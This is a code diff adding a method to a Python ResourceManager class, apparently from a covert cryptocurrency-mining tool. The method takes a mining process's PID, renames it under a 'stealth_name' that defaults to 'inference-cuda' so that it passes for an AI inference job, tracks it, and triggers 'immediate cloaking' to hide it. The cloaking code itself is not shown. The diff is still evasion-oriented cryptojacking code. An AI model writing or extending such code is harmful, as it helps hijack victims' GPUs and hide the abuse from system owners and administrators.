@@ -981,6 +981,68 @@ class ResourceManager(IResourceManager):
             else:
                 self.logger.info(f"✅ [PROCESS DISCOVERY] Completed - no mining processes found")
 
+    def receive_from_registry(self, pid: int, registry_metadata: Dict[str, Any]) -> bool:
+        """
+        **Receive From Registry** (nhận từ registry)
+        
+        NEW METHOD: Final step trong linear flow từ DirectPIDRegistry.
+        Implements: DirectPIDRegistry → ResourceManager (CORRECT FLOW)
+        
+        Args:
+            pid: Process ID từ registry
+            registry_metadata: Metadata từ registry forwarding
+            
+        Returns:
+            bool: True nếu resource management initialization successful
+        """
+        try:
+            self.logger.info(f"🎯 [RM-REGISTRY-RECEIVE] Receiving PID {pid} from DirectPIDRegistry (FINAL STEP)")
+            self.logger.debug(f"🔍 [RM-REGISTRY-RECEIVE] Registry metadata: {registry_metadata}")
+            
+            # **Extract process information** (trích xuất thông tin tiến trình)
+            source_chain = registry_metadata.get('source_chain', [])
+            process_info = registry_metadata.get('process_info', {})
+            stealth_name = registry_metadata.get('stealth_name', 'inference-cuda')
+            
+            self.logger.info(f"🔗 [RM-REGISTRY-RECEIVE] Complete source chain: {' → '.join(source_chain + ['resource_manager'])}")
+            
+            # **Create MiningProcess object** (tạo đối tượng MiningProcess)
+            try:
+                import psutil
+                process_obj = psutil.Process(pid)
+                mining_process = MiningProcess(
+                    pid=pid,
+                    name=stealth_name,
+                    process_type='GPU',
+                    start_time=registry_metadata.get('timestamp', time.time()),
+                    process_obj=process_obj
+                )
+                
+                # **Add to tracking list** (thêm vào danh sách theo dõi)
+                with self.mining_processes_lock:
+                    # Check for duplicates
+                    existing = [p for p in self.mining_processes if p.pid == pid]
+                    if not existing:
+                        self.mining_processes.append(mining_process)
+                        self.logger.info(f"📋 [RM-REGISTRY-RECEIVE] Added to tracking list: PID={pid}")
+                    else:
+                        self.logger.info(f"📋 [RM-REGISTRY-RECEIVE] Already tracked: PID={pid}")
+                
+                # **Immediate cloaking activation** (kích hoạt cloaking tức thì)
+                self.logger.info(f"🔒 [RM-REGISTRY-RECEIVE] Activating immediate cloaking for PID={pid}")
+                self._trigger_immediate_cloaking(mining_process)
+                
+                self.logger.info(f"✅ [RM-REGISTRY-RECEIVE] Successfully processed PID {pid} from DirectPIDRegistry")
+                return True
+                
+            except psutil.NoSuchProcess:
+                self.logger.error(f"❌ [RM-REGISTRY-RECEIVE] Process {pid} no longer exists")
+                return False
+                
+        except Exception as e:
+            self.logger.error(f"❌ [RM-REGISTRY-RECEIVE] Failed to receive from registry for PID {pid}: {e}")
+            return False
+    
     def receive_from_coordinator(self, pid: int, coordinator_metadata: Dict[str, Any]) -> bool:
         """
         **Receive From Coordinator** (nhận từ coordinator)
